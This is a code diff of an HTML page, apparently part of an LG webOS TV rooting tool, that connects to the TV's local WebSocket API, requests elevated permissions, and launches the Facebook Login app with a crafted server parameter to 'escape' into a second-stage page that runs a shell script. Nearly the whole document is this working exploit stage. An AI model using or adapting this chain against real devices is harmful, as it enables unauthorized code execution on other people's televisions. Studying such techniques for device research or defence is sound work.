@@ -7,14 +7,12 @@
         body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 10vh; }
         .button { padding: 20px; width: 300px; margin: 10px; font-size: 1.2rem; border-radius: 50px; border: none; cursor: pointer; color: white; }
         #btn-run { background: #ff0066; border: 2px solid #ff9900; }
-        #btn-reset { background: #444; }
-        #log { background: #000; color: #00ff00; width: 80%; height: 150px; margin: 20px auto; padding: 10px; text-align: left; font-family: monospace; overflow-y: auto; border: 1px solid #333; }
+        #log { background: #000; color: #00ff00; width: 80%; height: 150px; margin: 20px auto; padding: 10px; text-align: left; font-family: monospace; border: 1px solid #333; }
     </style>
 </head>
 <body>
     <h1>Return the Beanbird Cursor</h1>
     <button id="btn-run" class="button">Return Beanbird Cursor</button>
-    <button id="btn-reset" class="button">Reset to Default</button>
     <div id="log">Status: Ready.</div>
 
     <script>
@@ -23,46 +21,53 @@
 
         function log(m) { logBox.innerHTML += `<br>> ${m}`; logBox.scrollTop = logBox.scrollHeight; }
 
-        // The "request" function that replaces webOSTV.js
-        function request(ws, uri, payload) {
+        // This is the manual request function that talks to the TV
+        var request = function(ws, uri, payload) {
             ws.send(JSON.stringify({
-                id: "req_" + Math.random().toString(36).substr(2, 9),
+                id: "req_" + Math.random().toString(36).substring(2, 9),
                 type: "request",
                 uri: uri,
                 payload: payload
             }));
-        }
+        };
 
-        function start(scriptName) {
-            log("Connecting...");
-            const ws = new WebSocket('ws://127.0.0.1:3000');
+        document.getElementById('btn-run').onclick = function() {
+            log("Connecting to TV...");
+            var ws = new WebSocket('ws://127.0.0.1:3000');
             
-            ws.onopen = () => {
-                log("Connected. ACCEPT THE PROMPT ON TV.");
+            ws.onopen = function() {
+                log("Connection open. Sending Registration...");
+                // This payload triggers the prompt in your screenshot
                 ws.send(JSON.stringify({
                     id: "register_0",
                     type: "register",
-                    payload: { forcePairing: false, pairingType: "PROMPT", manifest: { permissions: ["LAUNCH"] } }
+                    payload: { 
+                        forcePairing: false, 
+                        pairingType: "PROMPT", 
+                        manifest: { 
+                            permissions: ["LAUNCH", "SYSTEM_CONTROL", "READ_INSTALLED_APPS"] 
+                        } 
+                    }
                 }));
             };
 
-            ws.onmessage = (e) => {
-                const res = JSON.parse(e.data);
+            ws.onmessage = function(e) {
+                var res = JSON.parse(e.data);
                 if (res.type === "registered") {
-                    log("Escaping to Stage 2...");
-                    const stage2 = `${SITE_URL}/stage2.html?script=${scriptName}`;
+                    log("Authorized! Escaping to Stage 2...");
                     
-                    // Triggering the Facebook Login app escape
+                    // The "Facebook Login" Escape
+                    var stage2 = SITE_URL + "/stage2.html?run=beanbird.sh";
                     request(ws, "ssap://system.launcher/launch", {
                         id: "com.webos.app.facebooklogin",
-                        params: { server: stage2.replace(/https?:\/\//, '') + "#" }
+                        params: { 
+                            server: stage2.replace(/https?:\/\//, '') + "#" 
+                        }
                     });
                 }
             };
-        }
-
-        document.getElementById('btn-run').onclick = () => start('beanbird.sh');
-        document.getElementById('btn-reset').onclick = () => start('reboot.sh');
+            ws.onerror = function() { log("Error: Ensure LG Connect Apps is ON."); };
+        };
     </script>
 </body>
 </html>
